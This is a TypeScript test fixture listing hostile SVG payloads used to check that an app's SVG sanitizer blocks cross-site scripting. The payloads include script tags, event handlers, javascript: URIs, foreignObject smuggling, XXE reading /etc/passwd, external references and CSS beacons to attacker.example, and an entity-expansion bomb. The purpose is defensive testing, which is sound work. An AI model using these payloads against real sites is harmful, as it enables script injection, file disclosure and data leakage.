// ─── Hostile SVG payload corpus ─────────────────────────────────────────────
// THE attack surface for sanitizeSvgMarkup / prepareSvgUpload (src/app/lib/svgUpload.ts).
//
// Every untrusted SVG in Desk Doodles flows through sanitizeSvgMarkup before it
// reaches `dangerouslySetInnerHTML` — both at upload (DrawPanel/DrawSurface) AND
// on read of every public-feed row (DeskPage / DeskGallery). RLS can't parse SVG,
// so sanitize-on-read is the ONE enforceable XSS layer. This corpus proves it holds.
//
// Each payload carries an EXPECTED outcome the battery asserts against:
//   - 'no-exec'      → after sanitize + DOM injection, ZERO script/handler fires
//                       (the dangerous primitive is stripped; benign shell may remain)
//   - 'rejected'     → prepareSvgUpload returns { ok: false } (file-level refusal)
//   - 'no-exec-and-stripped' → no exec AND a named token (e.g. 'onload=', 'javascript:',
//                       '<script') is absent from the sanitized string
//
// Shared by the browser harness (security-battery.tsx) and any node-side checks.
// Repo-side tool only — tools/ never ships in the Make drag-drop.

export type ExpectedOutcome = 'no-exec' | 'rejected' | 'no-exec-and-stripped';

export interface Payload {
  /** Stable id used in the report + screenshot filenames. */
  id: string;
  /** Attack family for grouping in the table. */
  family: string;
  /** One-line human description of the vector. */
  desc: string;
  /** The raw hostile markup fed to the sanitizer (or prepareSvgUpload via a File). */
  markup: string;
  /** What MUST be true after sanitize for this to pass. */
  expected: ExpectedOutcome;
  /**
   * Tokens that MUST be absent from the sanitized output string for a
   * 'no-exec-and-stripped' verdict. Case-insensitive substring match.
   */
  forbiddenTokens?: string[];
  /**
   * If true, the payload is ALSO run through prepareSvgUpload (as a File) and the
   * file-level verdict is recorded. Default: run sanitizeSvgMarkup only.
   */
  alsoFileGate?: boolean;
}

// A unique beacon every executing payload tries to set. The harness clears it
// before each run; if it survives → the payload EXECUTED → real finding.
export const BEACON_FLAG = '__dd_xss_fired';

// Helper so each payload's "evidence of execution" mutates the same beacon.
// e.g. `onload="${BEACON_CALL}"` — keeps detection uniform across vectors.
export const BEACON_CALL = `window.${BEACON_FLAG}=(window.${BEACON_FLAG}||0)+1`;

export const PAYLOADS: Payload[] = [
  // ── Family 1: inline <script> ────────────────────────────────────────────
  {
    id: 'script-inline',
    family: 'inline-script',
    desc: 'Inline <script> directly inside <svg>',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>${BEACON_CALL};</script><rect width="100" height="100" fill="#c33"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<script', BEACON_FLAG],
  },
  {
    id: 'script-cdata',
    family: 'inline-script',
    desc: 'Inline <script> with CDATA wrapper',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script><![CDATA[${BEACON_CALL};]]></script><circle cx="50" cy="50" r="40" fill="#39c"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<script', BEACON_FLAG],
  },
  {
    id: 'script-nested-svg',
    family: 'inline-script',
    desc: 'Inline <script> nested inside an inner <svg>',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><svg><script>${BEACON_CALL};</script></svg><rect width="100" height="100" fill="#7a5"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<script', BEACON_FLAG],
  },

  // ── Family 2: on* event handlers ─────────────────────────────────────────
  {
    id: 'onload-svg',
    family: 'event-handler',
    desc: 'onload handler on the root <svg>',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="${BEACON_CALL}"><rect width="100" height="100" fill="#c63"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onload', BEACON_FLAG],
  },
  {
    id: 'onload-unquoted',
    family: 'event-handler',
    desc: 'onload handler with UNQUOTED attribute value (regex-strip evasion)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width=100 height=100 onload=${BEACON_FLAG}=1><rect width=100 height=100 fill=#a3c /></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onload', BEACON_FLAG],
  },
  {
    id: 'onerror-image',
    family: 'event-handler',
    desc: 'onerror on <image> with a broken href (fires on load failure)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><image href="x-does-not-exist://nope" width="100" height="100" onerror="${BEACON_CALL}"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onerror', BEACON_FLAG],
  },
  {
    id: 'onclick-rect',
    family: 'event-handler',
    desc: 'onclick handler on a <rect> (fires on synthetic click)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect id="dd-click-target" width="100" height="100" fill="#36c" onclick="${BEACON_CALL}"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onclick', BEACON_FLAG],
  },
  {
    id: 'onbegin-animate',
    family: 'event-handler',
    desc: 'onbegin handler on <animate> (SMIL lifecycle event)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#5b7"><animate attributeName="x" from="0" to="10" dur="0.1s" onbegin="${BEACON_CALL}"/></rect></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onbegin', BEACON_FLAG],
  },
  {
    id: 'onmouseover-mixed-case',
    family: 'event-handler',
    desc: 'oNmOuSeOvEr — mixed-case handler (case-folding evasion)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#b59" oNmOuSeOvEr="${BEACON_CALL}"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['mouseover', BEACON_FLAG],
  },

  // ── Family 3: javascript: / data: URIs in hrefs ──────────────────────────
  {
    id: 'js-href-anchor',
    family: 'javascript-uri',
    desc: 'javascript: in <a href> (clickable link)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><a href="javascript:${BEACON_CALL}"><rect id="dd-click-target" width="100" height="100" fill="#c93"/></a></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['javascript:', BEACON_FLAG],
  },
  {
    id: 'js-xlink-href',
    family: 'javascript-uri',
    desc: 'javascript: in xlink:href (legacy namespace)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><a xlink:href="javascript:${BEACON_CALL}"><rect id="dd-click-target" width="100" height="100" fill="#39a"/></a></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['javascript:', BEACON_FLAG],
  },
  {
    id: 'js-href-whitespace',
    family: 'javascript-uri',
    desc: 'java\\tscript: with embedded tab/newline (URI-parser evasion)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><a href="java&#9;script:${BEACON_CALL}"><rect id="dd-click-target" width="100" height="100" fill="#7c3"/></a></svg>`,
    expected: 'no-exec',
  },
  {
    id: 'data-uri-script-image',
    family: 'javascript-uri',
    desc: 'data:text/html;base64 (script) in <image> href',
    // base64 of: <script>window.__dd_xss_fired=1</script>
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><image href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19kZF94c3NfZmlyZWQ9MTwvc2NyaXB0Pg==" width="100" height="100"/></svg>`,
    expected: 'no-exec',
  },

  // ── Family 4: <foreignObject> smuggling HTML ─────────────────────────────
  {
    id: 'foreignobject-script',
    family: 'foreign-object',
    desc: '<foreignObject> wrapping an HTML <script>',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>${BEACON_CALL}</script></body></foreignObject></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<script', BEACON_FLAG],
  },
  {
    id: 'foreignobject-img-onerror',
    family: 'foreign-object',
    desc: '<foreignObject> wrapping an HTML <img onerror>',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><img src="x-broken" onerror="${BEACON_CALL}"/></body></foreignObject></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onerror', BEACON_FLAG],
  },

  // ── Family 5: external entity / XXE attempt ──────────────────────────────
  {
    id: 'xxe-doctype-entity',
    family: 'xxe',
    desc: 'DOCTYPE with external SYSTEM entity (XXE file read attempt)',
    markup: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="50">&xxe;</text></svg>`,
    expected: 'no-exec',
    forbiddenTokens: ['etc/passwd', 'SYSTEM'],
  },
  {
    id: 'xxe-param-entity',
    family: 'xxe',
    desc: 'Parameter-entity DOCTYPE (out-of-band XXE shape)',
    markup: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#a55"/></svg>`,
    expected: 'no-exec',
    forbiddenTokens: ['attacker.example', 'SYSTEM'],
  },
  {
    id: 'use-external-ref',
    family: 'xxe',
    desc: '<use> referencing an external document fragment (SSRF/exfil shape)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><use xlink:href="http://attacker.example/evil.svg#x"/></svg>`,
    expected: 'no-exec',
    forbiddenTokens: ['attacker.example'],
  },

  // ── Family 6: <style> beacons ────────────────────────────────────────────
  // These two FAILED the first run under DOMPurify's bare SVG profile: <style>
  // survived, so the external URL fired a live request on inject (caught by the
  // driver's network block). Hardened in svgUpload.ts via FORBID_TAGS:['style'].
  // Asserted strict now so the fix can't silently regress.
  {
    id: 'style-import-beacon',
    family: 'style-beacon',
    desc: '<style> @import to an external stylesheet (CSS exfil beacon)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><style>@import url("http://attacker.example/beacon.css");</style><rect width="100" height="100" fill="#959"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<style', 'attacker.example', '@import'],
  },
  {
    id: 'style-url-background',
    family: 'style-beacon',
    desc: '<style> with url() background pointing offsite (request beacon)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><style>rect{fill:url(http://attacker.example/x.png)}</style><rect width="100" height="100"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<style', 'attacker.example'],
  },

  // ── Family 7: billion-laughs / huge nesting (DoS shape) ──────────────────
  {
    id: 'billion-laughs',
    family: 'dos-nesting',
    desc: 'Billion-laughs entity expansion bomb',
    markup:
      `<?xml version="1.0"?><!DOCTYPE lolz [` +
      `<!ENTITY lol "lol">` +
      `<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">` +
      `<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">` +
      `<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]>` +
      `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&lol4;</text></svg>`,
    expected: 'no-exec',
    forbiddenTokens: ['ENTITY'],
  },
  {
    id: 'deep-nesting-2000',
    family: 'dos-nesting',
    desc: '2000-level deep <g> nesting (parser stack DoS shape)',
    markup:
      `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">` +
      '<g>'.repeat(2000) +
      '<rect width="100" height="100" fill="#484"/>' +
      '</g>'.repeat(2000) +
      `</svg>`,
    expected: 'no-exec',
  },

  // ── Family 8: malformed / unclosed ───────────────────────────────────────
  {
    id: 'unclosed-svg',
    family: 'malformed',
    desc: 'Unclosed <svg> with a trailing on* handler (parser-confusion)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#c55" onload="${BEACON_CALL}"`,
    expected: 'no-exec',
    forbiddenTokens: ['onload', BEACON_FLAG],
  },
  {
    id: 'broken-script-comment',
    family: 'malformed',
    desc: 'Script smuggled in a malformed comment / broken tag boundary',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><!--><script>${BEACON_CALL}</script>--><rect width="100" height="100" fill="#558"/></svg>`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['<script', BEACON_FLAG],
  },
  {
    id: 'mixed-garbage-handler',
    family: 'malformed',
    desc: 'Garbage prefix + valid svg carrying an onload (file-gate path)',
    markup: `not-an-svg-prefix <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="${BEACON_CALL}"><rect width="100" height="100" fill="#883"/></svg> trailing-garbage`,
    expected: 'no-exec-and-stripped',
    forbiddenTokens: ['onload', BEACON_FLAG],
    alsoFileGate: true,
  },
  {
    id: 'non-svg-rejected',
    family: 'malformed',
    desc: 'File with no <svg> element at all (must be rejected at file gate)',
    markup: `<html><body><script>${BEACON_CALL}</script></body></html>`,
    expected: 'rejected',
    alsoFileGate: true,
  },

  // ── Benign control (proves the pipeline does NOT over-strip real art) ─────
  {
    id: 'benign-control',
    family: 'control',
    desc: 'Clean SVG that MUST survive sanitize intact (no over-stripping)',
    markup: `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><path d="M10 50 Q50 10 90 50 T90 90" stroke="#222" stroke-width="3" fill="none"/><circle cx="50" cy="50" r="8" fill="#e44"/></svg>`,
    expected: 'no-exec',
  },
];
